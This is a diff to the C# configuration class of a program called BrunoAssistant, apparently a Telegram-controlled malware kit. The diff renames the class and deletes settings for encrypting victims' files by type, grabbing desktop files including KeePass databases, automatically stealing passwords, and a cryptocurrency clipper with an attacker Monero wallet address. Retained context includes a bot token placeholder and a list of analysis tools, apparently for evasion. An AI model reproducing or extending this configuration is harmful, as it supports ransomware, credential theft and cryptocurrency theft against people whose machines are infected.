@@ -9,7 +9,7 @@
 
 namespace BrunoAssistant
 {
-    internal sealed class config
+    internal sealed class Config
     {
         // Telegram settings.
         public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
@@ -42,30 +42,5 @@ namespace BrunoAssistant
             "filemon", "regmon", "cain"
         };
         // Types of files to be encrypted
-        public static string[] EncryptionFileTypes =
-        {
-            ".lnk",
-            ".png", ".jpg", ".bmp", ".psd",
-            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
-            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
-        };
-        // Maximum file size to grab (in bytes).
-        public static long GrabFileSize = 6291456;
-        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
-        public static string[] GrabFileTypes =
-        {
-            ".kdbx",
-            ".png", ".jpg", ".bmp",
-            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
-            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
-        };
-        // Automatically steal all passwords and send to chat at first start.
-        public static bool AutoStealerEnabled = false;
-        // Clipper is enabled
-        public static bool ClipperEnabled = true;
-        // Your wallet addresses
-        public static string bitcoin_address = "";
-        public static string etherium_address = "";
-        public static string monero_address = "42bAF9fppY35cpFezM1xzuH83wjyrGGFZYmPw1PAyePrh7r5MiHZ8FXB4jErxpSkTUfu3jibcYr2Bbd7wuneL3bmPHUfVZu";
     }
 }
